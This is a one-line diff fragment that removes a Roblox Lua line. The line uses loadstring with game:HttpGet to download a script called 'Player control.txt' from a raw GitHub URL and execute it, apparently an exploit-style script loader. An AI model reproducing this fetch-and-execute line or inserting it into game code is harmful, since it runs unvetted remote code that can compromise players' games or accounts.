@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/114514icu/main/refs/heads/main/Player%20control.txt"))()
